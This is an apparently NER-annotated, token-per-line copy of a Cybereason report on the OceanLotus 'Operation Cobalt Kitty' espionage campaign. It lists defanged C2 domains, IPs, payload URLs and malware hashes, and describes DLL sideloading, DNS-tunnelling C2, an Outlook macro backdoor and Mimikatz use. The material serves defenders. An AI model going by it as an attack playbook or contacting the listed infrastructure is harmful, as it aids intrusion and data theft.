Philippines
.

Most
of
the
samples
caught
in-the-wild
seem
to
target
Vietnamese
speakers
.

Some
of
the
samples
exhibit
clear
evidence
of
targeting
Vietnamese
entities
.

This
conclusion
is
derived
from
the
file
names
and
file
contents
that
are
written
in
Vietnamese
,
as
shown
in
the
examples
below
:
File
Name
:
Điện
thoại
bị
cháy.doc
SHA-1
:
38297392df481d2ecf00cc7f05ce3361bd575b04 B_hash
Malicious
Domain
/
IP
:
193.169.245(.)137 B_ip.unknown
©2017
Cybereason
Inc
.

All
rights
reserved
.

4
File
Name
:
ID2016.doc
SHA-1
:
bfb3ca77d95d4f34982509380f2f146f63aa41bc B_hash
Malicious
Domain
/
IP
:
support.chatconnecting(.)com B_url.cncsvr
File
Name
:
Giấy
yêu
cầu
bồi
thường
mới
2016
-
Hằng.doc
(
Translation
:
'
New
Claim
Form
2016
'
)
SHA-1
:
A5bddb5b10d673cbfe9b16a062ac78c9aa75b61c B_hash
Malicious
Domain
/
IP
:
blog.versign(.)info B_url.cncsvr
©2017
Cybereason
Inc
.

All
rights
reserved
.

5
Indicators
of
Compromise
(
IOCs
)
Malicious
files
Backdoors
File
name
SHA-1
hash
Msfte.dll
--
--
--
--
--
--
Variant
of
Backdoor.Win32.Denis B_malware.backdoor
be6342fc2f33d8380e0ee5531592e9f676bb1f94 B_hash
638b7b0536217c8923e856f4138d9caff7eb309d I
dcbe007ac5684793ea34bf27fdaa2952c4e84d12 I
43b85c5387aafb91aea599782622eb9d0b5b151f I
9afe0ac621c00829f960d06c16a3e556cd0de249 B_hash
973b1ca8661be6651114edf29b10b31db4e218f7 I
1c503a44ed9a28aad1fa3227dc1e0556bbe79919 I
2e29e61620f2b5c2fd31c4eb812c84e57f20214a I
c7b190119cec8c96b7e36b7c2cc90773cffd81fd I
185b7db0fec0236dff53e45b9c2a446e627b4c6a I
ef0f9aaf16ab65e4518296c77ee54e1178787e21 I
3cf4b44c9470fb5bd0c16996c4b2a338502a7517 B_hash
320e25629327e0e8946f3ea7c2a747ebd37fe26f B_hash
0d3a33cb848499a9404d099f8238a6a0e0a4b471 I
c219a1ac5b4fd6d20a61bb5fdf68f65bbd40b453 I
91e9465532ef967c93b1ef04b7a906aa533a370e I
Goopdate.dll
--
--
--
--
--
--
--
--
Goopy B_malware.backdoor
backdoor
product_info.dll
[
Backdoor
exploiting
DLL-hijacking
against
Kaspersky
Avpia
]
VbaProject.OTM
[
Outlook B_malware.backdoor
Macro
]
sunjavascheduler.ps1
sndVolSSO.ps1
SCVHost.ps1
fhsvcs.ps1
Goztp.ps1
[
PowerShell
versions
of
the
Denis B_malware.backdoor
/
Goopy B_malware.backdoor
backdoors
]
Cobalt
Strike
Beacons
©2017
Cybereason
Inc
.

All
rights
reserved
.

6
File
name
SHA-1
hash
dns.exe
cd675977bf235eac49db60f6572be0d4051b9c07 B_hash
msfte.dll
2f8e5f81a8ca94ec36380272e36a22e326aa40a4 B_hash
FVEAPI.dll
01197697e554021af1ce7e980a5950a5fcf88318 B_hash
sunjavascheduler.ps1
syscheck.ps1
dns.ps1
activator.ps1
nvidia.db
7657769f767cd021438fcce96a6befaf3bb2ba2d B_hash
Ed074a1609616fdb56b40d3059ff4bebe729e436 I
D667701804CA05BB536B80337A33D0714EA28129 I
F45A41D30F9574C41FE0A27CB121A667295268B2 I
7F4C28639355B0B6244EADBC8943E373344B2E7E I
Malicious
Word
Documents
***Some
of
the
phishing
emails
and
Word
documents
were
very
targeted
and
personalized
,
therefore
,
they
are
not
listed
here
for
privacy
reasons
File
name
SHA-1
hash
CV.doc
Complaint
letter.doc
License
Agreement.doc
[
redacted
]
Loader
scripts
File
name
SHA-1
hash
syscheck.vbs
SndVolSSO.txt
62749484f7a6b4142a2b5d54f589a950483dfcc9 B_hash
cb3a982e15ae382c0f6bdacc0fcecf3a9d4a068d B_hash
©2017
Cybereason
Inc
.

All
rights
reserved
.

7
sunjavascheduler.txt
7a02a835016bc630aa9e20bc4bc0967715459daa B_hash
Obfuscated
/
customized
Mimikatz B_malware.unknown
File
name
SHA-1
hash
dllhosts.exe
5a31342e8e33e2bbe17f182f2f2b508edb20933f B_hash
23c466c465ad09f0ebeca007121f73e5b630ecf6 I
14FDEF1F5469EB7B67EB9186AA0C30AFAF77A07C I
KB571372.ps1
7CADFB90E36FA3100AF45AC6F37DC55828FC084A B_hash
KB647152.exe
7BA6BFEA546D0FC8469C09D8F84D30AB0F20A129 B_hash
KB647164.exe
BDCADEAE92C7C662D771507D78689D4B62D897F9 B_hash
kb412345.exe
e0aaa10bf812a17bb615637bf670c785bca34096 B_hash
kb681234.exe
4bd060270da3b9666f5886cf4eeaef3164fad438 B_hash
System.exe
33cb4e6e291d752b9dc3c85dfef63ce9cf0dbfbc B_hash
550f1d37d3dd09e023d552904cdfb342f2bf0d35 I
decoded
base64
Mimikatz B_malware.unknown
payload
c0950ac1be159e6ff1bf6c9593f06a3f0e721dd4 B_hash
Customized
credential
dumpers
File
name
SHA-1
hash
©2017
Cybereason
Inc
.

All
rights
reserved
.

8
log.exe
[
GetPassword_x64
]
7f812da330a617400cb2ff41028c859181fe663f B_hash
SRCHUI.dll
adrclients.dll
[
HookPasswordChange
]
KB471623.exe
[
Custom
password
dumper
]
29BD1BAC25F753693DF2DDF70B83F0E183D9550D B_hash
FC92EAC99460FA6F1A40D5A4ACD1B7C3C6647642 I
6609A347932A11FA4C305817A78638E07F04B09F B_hash
doutlook.ps1
adobe.dat
adrclients.ps1
[
Custom
password
dumper
]
EBDD6059DA1ABD97E03D37BA001BAD4AA6BCBABD B_hash
B769FE81996CBF7666F916D741373C9C55C71F15 I
E64C2ED72A146271CCEE9EE904360230B69A2C1D I
Miscellaneous
tools
File
name
SHA-1
hash
pshdll35.dll
pshdll40.dll
[
PSUnlock
-
PowerShell
Bypass
tool
]
52852C5E478CC656D8C4E1917E356940768E7184 B_hash
EDD5D8622E491DFA2AF50FE9191E788CC9B9AF89 I
C5e19c02a9a1362c67ea87c1e049ce9056425788 B_hash
0908a7fbc74e32cded8877ac983373ab289608b3 I
6aec53554f93c61f4e3977747328b8e2b1283af2 B_hash
KB-10233.exe
kb74891.exe
[
NetCat
]
IP.exe
cmd.exe
dllhost.exe
[
IP
check
Tool
]
Payloads
from
C
&
C
servers
URL
Payload
SHA-1
hash
©2017
Cybereason
Inc
.

All
rights
reserved
.

9
hxxp://104.237.218(.)67:80/icon.ico B_url.cncsvr
6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09 B_hash
hxxp://support.chatconnecting(.)com:80/icon.ico B_url.cncsvr
c41972517f268e214d1d6c446ca75e795646c5f2 B_hash
hxxp://food.letsmiles(.)org/login.txt B_url.cncsvr
9f95b81372eaf722a705d1f94a2632aad5b5c180 B_hash
hxxp://food.letsmiles(.)org/9niL B_url.cncsvr
5B4459252A9E67D085C8B6AC47048B276C7A6700 B_hash
hxxp://23.227.196(.)210:80/logscreen.jpg B_url.cncsvr
d8f31a78e1d158032f789290fa52ada6281c9a1f B_hash
50fec977ee3bfb6ba88e5dd009b81f0cae73955e I
hxxp://45.114.117(.)137/eXYF B_url.cncsvr
D1E3D0DDE443E9D294A39013C0D7261A411FF1C4 B_hash
91BD627C7B8A34AB334B5E929AF6F981FCEBF268 B_hash
hxxp://images.verginnet(.)info:80/ppap.png B_url.cncsvr
F0A0FB4E005DD5982AF5CFD64D32C43DF79E1402 B_hash
hxxp://176.107.176(.)6/QVPh B_url.cncsvr
8FC9D1DADF5CEF6CFE6996E4DA9E4AD3132702C B_hash
hxxp://108.170.31(.)69/a B_url.cncsvr
4a3f9e31dc6362ab9e632964caad984d1120a1a7 B_hash
hxxp://support(.)chatconnecting(.)com/pic.png B_url.cncsvr
bb82f02026cf515eab2cc88faa7d18148f424f72 B_hash
hxxp://blog.versign(.)info/access/?version=4&lid=[redacted]&token=[redacted] B_url.cncsvr
9e3971a2df15f5d9eb21d5da5a197e763c035f7a B_hash
hxxp://23.227.196(.)210/6tz8 B_url.cncsvr
bb82f02026cf515eab2cc88faa7d18148f424f72 B_hash
hxxp://23.227.196(.)210/QVPh B_url.cncsvr
8fc9d1dadf5cef6cfe6996e4da9e4ad3132702c5 B_hash
hxxp://45.114.117(.)137/3mkQ B_url.cncsvr
91bd627c7b8a34ab334b5e929af6f981fcebf268 B_hash
hxxp://176.223.111(.)116:80/download/sido.jpg B_url.cncsvr
5934262D2258E4F23E2079DB953DBEBED8F07981 B_hash
hxxp://110.10.179(.)65:80/ptF2 B_url.cncsvr
DA2B3FF680A25FFB0DD4F55615168516222DFC10 B_hash
hxxp://110.10.179(.)65:80/download/microsoftp.jpg B_url.cncsvr
23EF081AF79E92C1FBA8B5E622025B821981C145 B_hash
hxxp://110.10.179(.)65:80/download/microsoft.jpg B_url.cncsvr
C845F3AF0A2B7E034CE43658276AF3B3E402EB7B B_hash
©2017
Cybereason
Inc
.

All
rights
reserved
.

10
hxxp://27.102.70(.)211:80/image.jpg B_url.cncsvr
9394B5EF0B8216528CED1FEE589F3ED0E88C7155 B_hash
C
&
C
IPs
45.114.117(.)137 B_ip.cncsvr
104.24.119(.)185 B_ip.cncsvr
104.24.118(.)185 B_ip.cncsvr
23.227.196(.)210 B_ip.cncsvr
23.227.196(.)126 B_ip.cncsvr
184.95.51(.)179 B_ip.cncsvr
176.107.177(.)216 B_ip.cncsvr
192.121.176(.)148 B_ip.cncsvr
103.41.177(.)33 B_ip.cncsvr
184.95.51(.)181 B_ip.cncsvr
23.227.199(.)121 B_ip.cncsvr
108.170.31(.)69 B_ip.cncsvr
104.27.167(.)79 B_ip.cncsvr
104.27.166(.)79 B_ip.cncsvr
176.107.176(.)6 B_ip.cncsvr
184.95.51(.)190 B_ip.cncsvr
176.223.111(.)116 B_ip.cncsvr
110.10.179(.)65 B_ip.cncsvr
27.102.70(.)211 B_ip.cncsvr
C
&
C
Domains
food.letsmiles(.)org B_url.cncsvr
help.chatconnecting(.)com B_url.cncsvr
*.letsmiles(.)org B_url.cncsvr
support.chatconnecting(.)com B_url.cncsvr
inbox.mailboxhus(.)com B_url.cncsvr
blog.versign(.)info B_url.cncsvr
news.blogtrands(.)net B_url.cncsvr
stack.inveglob(.)net B_url.cncsvr
tops.gamecousers(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
tonholding(.)com B_url.cncsvr
cloudwsus(.)net B_url.cncsvr
nortonudt(.)net B_url.cncsvr
teriava(.)com B_url.cncsvr
tulationeva(.)com B_url.cncsvr
©2017
Cybereason
Inc
.

All
rights
reserved
.

11
vieweva(.)com B_url.cncsvr
notificeva(.)com B_url.cncsvr
images.verginnet(.)info B_url.cncsvr
id.madsmans(.)com B_url.cncsvr
lvjustin(.)com B_url.cncsvr
play.paramountgame(.)com B_url.cncsvr
Appendix B_hash
A I
:
Threat
actor
payloads
caught
in
the
wild
Domain
Details
VirusTotal
inbox.mailboxhus(.)com B_url.cncsvr
support.chatconnecting(.)com B_url.cncsvr
File
name
:
Flash.exe
SHA-1
:
01ffc3ee5c2c560d29aaa8ac3d17f0ea4f6c0c09 B_hash
Submitted
:
2016-12-28
09:51:13
Link
(
45.114.117.137 B_ip.cncsvr
)
inbox.mailboxhus(.)com B_url.cncsvr
support.chatconnecting(.)com B_url.cncsvr
(
45.114.117[.]137 B_ip.cncsvr
)
File
name
:
Flash.exe
SHA-1
:
562aeced9f83657be218919d6f443485de8fae9e B_hash
Submitted
:
2017-01-18
19:00:41
Link
support.chatconnecting(.)com B_url.cncsvr
URL
:
hxxp://support(.)chatconnecting.com/2nx7m B_url.cncsvr
Submitted
:
2017-01-20
10:11:47
Link
(
45.114.117[.]137 B_ip.cncsvr
)
support.chatconnecting(.)com B_url.cncsvr
(
45.114.117[.]137 B_ip.cncsvr
)
File
name
:
ID2016.doc
SHA-1
:
bfb3ca77d95d4f34982509380f2f146f63aa41bc B_hash
Submitted
:
2016-11-23
08:18:43
Malicious
Word
document
(
Phishing
text
in
Vietnamese
)
Link
blog(.)versign(.)info B_url.cncsvr
(
23.227.196[.]210 B_ip.cncsvr
)
blog(.)versign(.)info B_url.cncsvr
(
23.227.196[.]210 B_ip.cncsvr
)
File
name
:
tx32.dll
SHA-1
:
604a1e1a6210c96e50b72f025921385fad943ddf B_hash
Submitted
:
2016-08-15
04:04:46
File
name
:
Giấy
yêu
cầu
bồi
thường
mới
2016
-
Hằng.doc
SHA-1
:
a5bddb5b10d673cbfe9b16a062ac78c9aa75b61c B_hash
Submitted
:
2016-10-06
11:03:54
Malicious
Word
document
with
Phishing
text
in
Vietnamese
Link
Link
©2017
Cybereason
Inc
.

All
rights
reserved
.

12
blog(.)versign(.)info B_url.cncsvr
(
23.227.196[.]210 B_ip.cncsvr
)
Images.verginnet(.)info B_url.cncsvr
id.madsmans(.)com B_url.cncsvr
(
176.107.176[.]6 B_ip.cncsvr
)
tonholding(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
tonholding(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
teriava(.)com B_url.cncsvr
File
name
:
Thong
tin.doc
SHA-1
:
a5fbcbc17a1a0a4538fd987291f8dafd17878e33 B_hash
Submitted
:
2016-10-25
Malicious
Word
document
with
Phishing
text
in
Vietnamese
File
name
:
WinWord.exe
SHA-1
:
ea67b24720da7b4adb5c7a8a9e8f208806fbc198 B_hash
Submitted
:
Cobalt
Strike
payload
Downloads
hxxp://images.verginnet(.)info/2NX7M B_url.cncsvr
Using
Cobalt
Strike
malleable
c2
oscp
profile
File
name
:
SndVolSSO.exe
SHA-1
:
1fef52800fa9b752b98d3cbb8fff0c44046526aa B_hash
Submitted
:
2016-08-01
09:03:58
Denis B_malware.backdoor
Backdoor
Variant
File
name
:
Xwizard
/
KB12345678.exe
SHA-1
:
d48602c3c73e8e33162e87891fb36a35f621b09b B_hash
Submitted
:
2016-08-01
File
name
:
CiscoEapFast.exe
SHA-1
:
77dd35901c0192e040deb9cc7a981733168afa74 B_hash
Submitted
:
2017-02-28
16:37:12
Denis B_malware.backdoor
Backdoor
Variant
Link
Link
Link
Link
Link
Appendix B_hash
B I
:
Denis B_malware.backdoor
Backdoor
samples
in
the
wild
File
name
SHA-1
msprivs.exe
97fdab2832550b9fea80ec1b9c182f5139e9e947 B_hash
Domain
teriava(.)com B_url.cncsvr
WerFault.exe
F25d6a32aef1161c17830ea0cb950e36b614280d B_hash
teriava(.)com B_url.cncsvr
msprivs.exe
1878df8e9d8f3d432d0bc8520595b2adb952fb85 B_hash
teriava(.)com B_url.cncsvr
CiscoEapFast.exe
094.exe
1a2cd9b94a70440a962d9ad78e5e46d7d22070d0 B_hash
teriava(.)com B_url.cncsvr
,
tulationeva(.)com B_url.cncsvr
,
©2017
Cybereason
Inc
.

All
rights
reserved
.

13
CiscoEapFast.exe
77dd35901c0192e040deb9cc7a981733168afa74 B_hash
notificeva(.)com B_url.cncsvr
teriava(.)com B_url.cncsvr
,
tulationeva(.)com B_url.cncsvr
,
notificeva(.)com B_url.cncsvr
gl-appspot(.)org B_url.cncsvr
tonholding(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
SwUSB.exe
F
:
\malware\Anh
Dương\lsma.exe
Xwizard.exe
KB12345678.exe
SndVolSSO.exe
88d35332ad30964af4f55f1e44c951b15a109832 B_hash
d48602c3c73e8e33162e87891fb36a35f621b09b B_hash
tonholding(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
1fef52800fa9b752b98d3cbb8fff0c44046526aa B_hash
tonholding(.)com B_url.cncsvr
nsquery(.)net B_url.cncsvr
©2017
Cybereason
Inc
.

All
rights
reserved
.

14
Cybereason
is
the
leader
in
endpoint
protection
,
offering
endpoint
detection
and
response
,
next-generation
antivirus
,
and
active
monitoring
services
.

Founded
by
elite
intelligence
professionals
born
and
bred
in
offense-first
hunting
,
Cybereason
gives
enterprises
the
upper
hand
over
cyber
adversaries
.

The
Cybereason
platform
is
powered
by
a
custom-built
in-memory
graph
,
the
only
truly
automated
hunting
engine
anywhere
.

It
detects
behavioral
patterns
across
every
endpoint
and
surfaces
malicious
operations
in
an
exceptionally
user-friendly
interface
.

Cybereason
is
privately
held
and
headquartered
in
Boston
with
offices
in
London
,
Tel
Aviv
,
and
Tokyo
.

2
©2016
Cybereason
.

All
rights
reserved
.
A
Large
Scale
Cyber
Espionage
APT
in
Asia
cybereason.com/labs-operation-cobalt-kitty-a-large-scale-apt-in-asia-carried-out-by-the-oceanlotus-group/

Operation
Cobalt
Kitty
:
A
large-scale
APT
in
Asia
carried
out
by
the
OceanLotus
Group
5/23/2017

Post
by
:
Assaf
Dahan

The
investigation
of
a
massive
cyber
espionage
APT
(
Advanced
Persistent
Threat
)
became
a
game
of
one-upmanship
between
attackers
and
defenders
.

Dubbed
Operation
Cobalt
Kitty
,
the
APT
targeted
a
global
corporation
based
in
Asia
with
the
goal
of
stealing
proprietary
business
information
.

The
threat
actor
targeted
the
company's
top-level
management
by
using
sophisticated
spear-phishing  B_malware.infosteal
attacks
as
the
initial
penetration
vector
,
ultimately
compromising
the
computers
of
vice
presidents
,
senior
directors
and
other
key
personnel
in
the
operational
departments
.

During
Operation
Cobalt
Kitty
,
the
attackers
compromised
more
than
40
PCs
and
servers
,
including
the
domain
controller
,
file
servers
,
Web
application
server
and
database
server
.

Forensic
artifacts
revealed
that
the
attackers
persisted
on
the
network
for
at
least
a
year
before
Cybereason
was
deployed
.

The
adversary
proved
very
adaptive
and
responded
to
company's
security
measures
by
periodically
changing
tools
,
techniques
and
procedures
(
TTPs
)
,
allowing
them
to
persist
on
the
network
for
such
an
extensive
period
of
time
.

Over
80
payloads
and
numerous
domains
were
observed
in
this
operation
–
all
of
which
were
undetected
by
traditional
security
products
deployed
in
the
company's
environment
at
the
time
of
the
attack
.

The
attackers
arsenal
consisted
of
modified
publicly-available
tools
as
well
as
six
undocumented
custom-built
tools
,
which
Cybereason
considers
the
threat
actor's
signature
tools
.

Among
these
tools
are
two
backdoors
that
exploited
DLL
sideloading
attack
in
Microsoft
,
Google
and
Kaspersky
applications
.

In
addition
,
they
developed
a
novel
and
stealthy
backdoor
that
targets
Microsoft
Outlook
for
command-and-control
channel
and
data
exfiltration
.

Based
on
the
tools
,
modus
operandi
and
IOCs
(
indicators
of
compromise
)
observed
in
Operation
Cobalt
Kitty
,
Cybereason
attributes
this
large-scale
cyber
espionage
APT
to
the
'
OceanLotus
Group
'
(
which
is
also
known
as
,
APT-C-00
,
SeaLotus
and
APT32
)
.

For
detailed
information
tying
Operation
Cobalt
Kitty
to
the
OceanLotus
Group
,
please
see
our
Attacker's
Arsenal
and
Threat
Actor
Profile
sections
.

Cybereason
also
attributes
the
recently
reported
Backdoor.Win32.Denis  B_malware.backdoor
to
the
OceanLotus
Group
,
which
at
the
time
of
this
report's
writing
,
had
not
been
officially
linked
to
this
threat
actor
.

Finally
,
this
report
offers
a
rare
glimpse
into
what
a
cyber
espionage
APT
looks
like
'
under-the-hood
'
.

Cybereason
was
able
to
monitor
and
detect
the
entire
attack
lifecycle
,
from
infiltration
to
exfiltration
and
all
the
steps
in
between
.

Our
report
contains
the
following
detailed
sections
(
PDF
)
:

High-level
attack
outline
:
A
cat-and-mouse
game
in
four
acts

The
following
sections
outline
the
four
phases
of
the
attack
as
observed
by
Cybereason's
analysts
,
who
were
called
to
investigate
the
environment
after
the
company's
IT
department
suspected
that
their
network
was
breached
but
could
not
trace
the
source
.

Phase
one
:
Fileless  B_malware.unknown
operation
(
PowerShell
and
Cobalt
Strike
payloads
)

Based
on
the
forensic
evidence
collected
from
the
environment
,
phase
one
was
the
continuation
of
the
original
attack
that
began
about
a
year
before
Cybereason
was
deployed
in
the
environment
.

During
that
phase
,
the
threat
actor
operated
a
fileless  B_malware.unknown
PowerShell-based
infrastructure
,
using
customized
PowerShell
payloads
taken
from
known
offensive
frameworks
such
as
Cobalt
Strike
,
PowerSploit
and
Nishang
.

The
initial
penetration
vector
was
carried
out
by
social
engineering
.

Carefully
selected
group
of
employees
received
spear-phishing  B_malware.infosteal
emails
,
containing
either
links
to
malicious
sites
or
weaponized
Word
documents
.

These
documents
contained
malicious
macros
that
created
persistence
on
the
compromised
machine
using
two
scheduled
tasks
,
whose
purpose
was
to
download
secondary
payloads
(
mainly
Cobalt
Strike
Beacon
)
:

Scheduled
task
1
:
Downloads
a
COM
scriptlet
that
redirects
to
Cobalt
Strike
payload
:

Scheduled
task
2
:
Uses
Javascript
to
download
a
Cobalt
Strike
Beacon
:

See
more
detailed
analysis
of
the
malicious
documents
in
our
Attack
Life
Cycle
section
.

Fileless  B_malware.unknown
payload
delivery
infrastructure

In
the
first
phase
of
the
attack
,
the
attackers
used
a
fileless  B_malware.unknown
in-memory
payload
delivery
infrastructure
consisting
of
the
following
components
:

1
.
VBS
and
PowerShell-based
loaders

The
attackers
dropped
Visual
Basic
and
PowerShell
scripts
in
folders
that
they
created
under
the
ProgramData
(
a
hidden
folder
,
by
default
)
.

The
attackers
created
persistence
using
Windows
'
registry
,
services
and
scheduled
tasks
.

This
persistence
mechanism
ensured
that
the
loader
scripts
would
execute
either
at
startup
or
at
predetermined
intervals
.

Values
found
in
Windows
'
Registry
:
the
VBS
scripts
are
executed
by
Windows
'
Wscript
at
startup
:

The
.vbs
scripts
as
well
as
the
.txt
files
contain
the
loader's
script
,
which
launches
PowerShell
with
a
base64
encoded
command
,
which
either
loads
another
PowerShell
script
(
e.g
Cobalt
Strike
Beacon
)
or
fetches
a
payload
from
the
command-and-control
(
C&C
)
server
:
2
.

In-memory
fileless  B_malware.unknown
payloads
from
C&C
servers

The
payloads
served
by
the
C&C
servers
are
mostly
PowerShell
scripts
with
embedded
base64-encoded
payloads
(
Metasploit
and
Cobalt
Strike
payloads
)
:

Example
1
:
PowerShell
payload
with
embedded
Shellcode
downloading
Cobalt
Strike
Beacon

The
decoded
payload
is
a
shellcode
,
whose
purpose
is
to
retrieve
a
Cobalt
Strike
Beacon
from
the
C&C
server
:

Example
2
:
Cobalt
Strike
Beacon
embedded
in
obfuscated
PowerShell

A
second
type
of
an
obfuscated
PowerShell
payload
consisted
of
Cobalt
Strike's
Beacon
payload
:

Less
than
48
hours
after
Cybereason
alerted
the
company
about
the
breach
,
the
attackers
started
to
change
their
approach
and
almost
completely
abandoned
the
PowerShell
infrastructure
that
they
had
been
using
–
replacing
it
with
sophisticated
custom-built
backdoors
.

The
attackers
'
remarkable
ability
to
quickly
adapt
demonstrated
their
skill
and
familiarity
with
and
command
of
the
company's
network
and
its
operations
.


The
attackers
most
likely
replaced
the
PowerShell
infrastructure
after
the
company
used
both
Windows
Group

Policy
Object
(
GPO
)
and
Cybereason's
execution
prevention
feature
to
prevent
PowerShell
execution
.

Phase
two
:
Backdoors
exploiting
DLL-hijacking
and
using
DNS
tunneling

After
realizing
that
the
PowerShell
infrastructure
had
been
discovered
,
the
attackers
had
to
quickly
replace
it
to
maintain
persistence
and
continue
the
operation
.

Replacing
this
infrastructure
in
48
hours
suggests
that
the
threat
actors
were
prepared
for
such
a
scenario
.

During
the
second
phase
of
the
attack
,
the
attackers
introduced
two
sophisticated
backdoors
that
they
attempted
to
deploy
on
selected
targets
.

The
introduction
of
the
backdoors
is
a
key
turning
point
in
the
investigation
since
it
demonstrated
the
threat
actor's
resourcefulness
and
skill-set
.

At
the
time
of
the
attack
,
these
backdoors
were
undetected
and
undocumented
by
any
security
vendor
.

Recently
,
Kaspersky
researchers
identified
a
variant
of
one
of
the
backdoors
as
Backdoor.Win32.Denis  B_malware.backdoor
.

The
attackers
had
to
make
sure
that
they
remained
undetected
so
the
backdoors
were
designed
to
be
as
stealthy
as
possible
.

To
avoid
being
discovered
,
the
malware
authors
used
these
techniques
:

Backdoors
exploiting
DLL
hijacking
against
trusted
applications

The
backdoor
exploited
a
vulnerability
called
'
DLL
hijacking
'
in
order
to
'
hide
'
the
malware
inside
trusted
software
.

This
technique
exploits
a
security
vulnerability
found
in
legitimate
software
,
which
allows
the
attackers
to
load
a
fake

DLL
and
execute
its
malicious
code
.

Please
see
an
analysis
of
the
backdoors
in
the
Attacker's
Arsenal
section
.

The
attackers
exploited
this
vulnerability
against
the
following
trusted
applications
:

Windows
Search
(
vulnerable
applications
:
searchindexer.exe
/searchprotoclhost.exe
)

Fake
DLL
:
msfte.dll
(
638b7b0536217c8923e856f4138d9caff7eb309d  B_hash
)

Google
Update
(
d30e8c7543adbc801d675068530b57d75cabb13f  B_hash
)

Fake
DLL
:
goopdate.dll
(
973b1ca8661be6651114edf29b10b31db4e218f7  B_hash
)

Kaspersky's
Avpia
(
691686839681adb345728806889925dc4eddb74e  B_hash
)

Fake
DLL
:
product_info.dll
(
3cf4b44c9470fb5bd0c16996c4b2a338502a7517  B_hash
)

By
exploiting
legitimate
software
,
the
attackers
bypassed
application
whitelisting
and
legitimate
security
software
,
allowing
them
to
continue
their
operations
without
raising
any
suspicions
.

DNS
Tunneling
as
C2
channel
–

In
attempt
to
overcome
network
filtering
solutions
,
the
attackers
implemented
a
stealthier
C2
communication
method
,
using
'
DNS
Tunneling
'
–
a
method
of
C2
communicating
and
data
exfiltration
using
the
DNS
protocol
.

To
ensure
that
the
DNS
traffic
would
not
be
filtered
,
the
attackers
configured
the
backdoor
to
communicate
with
Google
and
OpenDNS
DNS
servers
,
since
most
organizations
and
security
products
will
not
filter
traffic
to
those
two
major
DNS
services
.


The
screenshot
below
shows
the
traffic
generated
by
the
backdoor
and
demonstrates
DNS
Tunneling
for
C2
communication
.

As
shown
,
while
the
destination
IP
is
'
8.8.8.8
'
–
Google's
DNS
server
–
the
malicious
domain
is
'
hiding
'
inside
the
DNS
packet
:

Phase
three
:
Novel
MS
Outlook B_malware.backdoor
backdoor  I
and
lateral
movement
spree

In
the
third
phase
of
the
operation
,
the
attackers
harvested
credentials
stored
on
the
compromised
machines
and
performed
lateral
movement
and
infected
new
machines
.

The
attackers
also
introduced
a
very
rare
and
stealthy
technique
to
communicate
with
their
servers
and
exfiltrate
data
using
Microsoft
Outlook
.

Outlook B_malware.backdoor
macro I
backdoor  I

In
a
relentless
attempt
to
remain
undetected
,
the
attackers
devised
a
very
stealthy
C2
channel
that
is
hard
to
detect
since
it
leverages
an
email-based
C2
channel
.

The
attackers
installed
a
backdoor
macro
in
Microsoft
Outlook
that
enabled
them
to
execute
commands
,
deploy
their
tools
and
steal
valuable
data
from
the
compromised
machines
.

For
a
detailed
analysis
of
the
Outlook B_malware.backdoor
backdoor  I
,
please
see
the
Attacker's
Arsenal
section
.

This
technique
works
as
follows
:
1
.
The
malicious
macro
scans
the
victim's
Outlook
inbox
and
looks
for
the
strings
'
$$cpte
'
and
'
$$ecpte
'
.

2
.
Then
the
macro
will
open
a
CMD
shell
that
will
execute
whatever
instruction
/
command
is
in
between
the
strings
.

3
.
The
macro
deletes
the
message
from
inbox
to
ensure
minimal
risk
of
exposure
.

4
.
The
macro
searches
for
the
special
strings
in
the
'
Deleted
Items
'
folder
to
find
the
attacker's
email
address
and
sends
the
data
back
to
the
attackers
via
email
.

5
.
Lastly
,
the
macro
will
delete
any
evidence
of
the
emails
received
or
sent
by
the
attackers
.

Credential
dumping
and
lateral
movement

The
attackers
used
the
famous
Mimikatz  B_malware.unknown
credential
dumping
tool
as
their
main
tool
to
obtain
credentials
including
user
passwords
,
NTLM
hashes
and
Kerberos
tickets
.

Mimikatz  B_malware.unknown
is
a
very
popular
tool
and
is
detected
by
most
antivirus
vendors
and
other
security
products
.

Therefore
,
the
attackers
used
over
10
different
customized
Mimikatz  B_malware.unknown
payloads
,
which
were
obfuscated
and
packed
in
a
way
that
allowed
them
to
evade
antivirus
detection
.

The
following
are
examples
of
Mimikatz  B_malware.unknown
command
line
arguments
detected
during
the
attack
:

The
stolen
credentials
were
used
to
infect
more
machines
,
leveraging
Windows
built-in
tools
as
well
as
pass-theticket
and
pass-the-hash
attacks
.

Phase
four
:
New
arsenal
and
attempt
to
restore
PowerShell
infrastructure

After
a
four
week
lull
and
no
apparent
malicious
activity
,
the
attackers
returned
to
the
scene
and
introduced
new
and
improved
tools
aimed
at
bypassing
the
security
mitigations
that
were
implemented
by
the
company's
IT
team
.

These
tools
and
methods
mainly
allowed
them
to
bypass
the
PowerShell
execution
restrictions
and
password
dumping
mitigations
.

During
that
phase
,
Cybereason
found
a
compromised
server
that
was
used
as
the
main
attacking
machine
,
where
the
attackers
stored
their
arsenal
in
a
network
share
,
which
made
it
easier
to
spread
their
tools
to
other
machines
on
the
network
.

The
attackers
'
arsenal
consisted
:

New
variants
of
Denis
and
Goopy B_malware.backdoor
backdoors

PowerShell
Restriction
Bypass
Tool
–
Adapted
from
PSUnlock
Github
project
.

PowerShell
Cobalt
Strike
Beacon
–
New
payload
+
new
C2
domain

PowerShell
Obfuscator
–
All
the
new
PowerShell
payloads
are
obfuscated
using
a
publicly
available
script
adapted
from
a
Daniel
Bohannon's
GitHub
project
.

HookPasswordChange
–
Inspired
by
tools
found
on
GitHub
,
this
tool
alerts
the
attackers
if
a
password
has
been
changed
.

Using
this
tool
,
the
attackers
could
overcome
a
password
reset
.

The
attackers
modified
their
tool
.

Customized
Windows
Credentials
Dumper
–
A
PowerShell
password
dumper
that
is
based
on
a
known
password
dumping
tool
,
using
PowerShell
bypass
and
reflective
loading
.

The
attackers
specifically
used
it
to
obtain
Outlook
passwords
.

Customized
Outlook
Credentials
Dumper
–
Inspired
by
known
Outlook
credentials
dumpers
.

Mimikatz  B_malware.unknown
–
PowerShell
and
Binary
versions
,
with
multiple
layers
of
obfuscation
.

Please
see
the
Attacker's
Arsenal
section
for
detailed
analysis
of
the
tools
.

An
analysis
of
this
arsenal
shows
that
the
attackers
went
out
of
their
way
to
restore
the
PowerShell-based
infrastructure
,
even
though
it
had
already
been
detected
and
shut
